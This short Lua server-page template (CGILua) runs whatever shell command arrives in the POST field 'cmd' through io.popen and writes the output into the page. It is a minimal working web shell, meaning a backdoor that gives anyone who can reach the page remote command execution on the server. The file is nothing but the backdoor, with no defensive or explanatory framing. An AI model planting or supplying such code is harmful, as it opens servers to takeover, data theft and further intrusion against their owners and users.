<% 
local handle = io.popen(cgilua.POST.cmd)
local result = handle:read("*a")
handle:close() %>
<%= result %>
